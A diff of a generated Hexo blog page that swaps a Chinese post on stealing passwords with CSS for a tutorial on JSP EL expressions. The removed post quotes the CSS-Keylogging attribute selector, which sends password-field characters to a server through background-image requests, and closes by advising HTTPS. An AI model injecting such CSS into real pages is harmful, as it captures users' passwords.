@@ -15,7 +15,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>使用Css获取用户密码 ~ Hexo</title>
+  <title>EL表达式 ~ Hexo</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
@@ -113,7 +113,7 @@
               
                 <p class="mt-3">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期一, 十二月 2日 2019, 3:58 下午
+                  星期一, 三月 2日 2020, 10:28 上午
                 </p>
               
 
@@ -122,7 +122,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    568 字
+                    703 字
                   </span>&nbsp;
                 
 
@@ -130,7 +130,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      2 分钟
+                      3 分钟
                   </span>&nbsp;
                 
 
@@ -163,16 +163,74 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h3 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h3><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p>
-<p>话题回到不一样的 css 上，github 上 <a href="https://github.com/jbtronics" target="_blank" rel="noopener">jbtronics</a> 给出了这样一份答案 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="noopener">CrookedStyleSheets</a>，在这里笔者直接给上该项目的<a href="https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md" target="_blank" rel="noopener">中文文档</a>，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p>
-<h3 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h3><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，<a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 更为巧妙的使用多重选择器去捕获相应的按键事件。</p>
-<p>核心代码如下:</p>
-<pre><code>input[type=&quot;password&quot;][value$=&quot;1&quot;] { background-image: url(&quot;http://localhost:3000/1&quot;); }</code></pre><p>解释如下：</p>
-<p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <code>http://localhost:3000/1</code> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p>
-<p>当 <code>value$=&quot;1&quot;</code> 时，我们可以监听用户输入 <code>1</code>，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p>
-<p><img src="http://blog.static.minfive.com/post/18-02-23/code.png" srcset="undefined" alt="code"></p>
-<p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>
+            <h5 id="1-el表达式-Expression-Language）"><a href="#1-el表达式-Expression-Language）" class="headerlink" title="1.el表达式(Expression Language）"></a>1.el表达式(Expression Language）</h5><p>   el表达式：是为了使JSP写起来更加简单;</p>
+<p>以MVC模式设计程序,JSP只是<a href="https://baike.baidu.com/item/%E8%A7%86%E5%9B%BE/1302820" target="_blank" rel="noopener">视图</a>，视图的任务就是显示响应，而不是在JSP中做任何关于程序控制和业务逻辑的事情。所以在JSP页面中应该尽可能少的、或者是完全不出现Java代码。</p>
+<h5 id="2-EL语法"><a href="#2-EL语法" class="headerlink" title="2.EL语法"></a>2.EL语法</h5><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以“${}”表示。</p>
+<h5 id="3-与-运算符"><a href="#3-与-运算符" class="headerlink" title="3.[ ]与.运算符"></a>3.[ ]与.运算符</h5><p>EL 提供“.“和“[ ]“两种运算符来存取数据。</p>
+<p>当要存取的属性名称中包含一些特殊字符，如 . 或 - 等并非字母或数字的符号，就一定要使用“[ ]“。例如：</p>
+<p>${ user. My-Name}应当改为${user[“My-Name”]}</p>
+<p>如果要动态取值时，就可以用“[ ]“来做，而“.“无法做到动态取值。例如：</p>
+<p>${sessionScope.user[data]}中data 是一个变量</p>
+<h5 id="4-变量"><a href="#4-变量" class="headerlink" title="4.变量"></a>4.变量</h5><p>EL存取变量数据的方法很简单，例如：${username}。它的意思是取出某一范围中名称为username的变量。</p>
+<p>因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。</p>
+<p>代码：</p>
+<pre><code class="jsp">&lt;%@page import=&quot;java.util.HashMap&quot;%&gt;
+&lt;%@page import=&quot;java.util.ArrayList&quot;%&gt;
+&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;
+    pageEncoding=&quot;UTF-8&quot;%&gt;
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+&lt;title&gt;Insert title here&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;%--用el表达式完成运算 --%&gt;
+    ${123+124}
+    ${123*124}
+    ${5&gt;18}
+    ${5&gt;3&amp;&amp;3&gt;5}
+    ${15&gt;12 and 13&lt;14}
+    ${12&lt;11 or 11&gt;8}
+    ${5!=3}
+    &lt;%--empty运算符的使用 --%&gt;
+    &lt;%
+       String str=null;
+    %&gt;
+    ${empty str}
+    ${not empty str}
+    &lt;%--用el表达式获取域对象的数据--%&gt;
+    &lt;%
+      request.setAttribute(&quot;ell&quot;, &quot;good night&quot;);
+      String ell=(String)request.getAttribute(&quot;ell&quot;);
+      out.write(ell);
+    %&gt; 
+    ${ell}
+    &lt;%--会从四个域对象中，一个一个找ell属性
+          先找 pageContext是否有ell属性，如果有就停止查找
+    直接输出ell属性对应的内容。如果没有继续查找request
+    对象中是否有ell属性，以此类推，直到查找到为止--%&gt;
+    ${requestScope.ell}
+    &lt;%--以上是只查找request对象的属性 --%&gt; 
+    ${sessionScope.ell}
+    ${applicationScope.ell}
+    &lt;%--el表达式获取集合数组中的数据--%&gt;
+    &lt;%
+      ArrayList&lt;String&gt; list=new ArrayList&lt;String&gt;();
+      list.add(&quot;abc&quot;);
+      list.add(&quot;bbb&quot;);
+      list.add(&quot;ccc&quot;);
+      HashMap&lt;String,String&gt; map=new HashMap&lt;String,String&gt;();
+      map.put(&quot;aa&quot;, &quot;moring&quot;);
+      map.put(&quot;bb&quot;,&quot;afternoon&quot;);
+      map.put(&quot;cc&quot;,&quot;night&quot;);
+      request.setAttribute(&quot;list1&quot;, list);
+      request.setAttribute(&quot;map1&quot;, map);
+    %&gt;
+    ${requestScope.list1[1]}
+    ${map1.bb}
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
 
             <hr>
           </div>
@@ -329,7 +387,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "使用Css获取用户密码&nbsp;",
+        "EL表达式&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
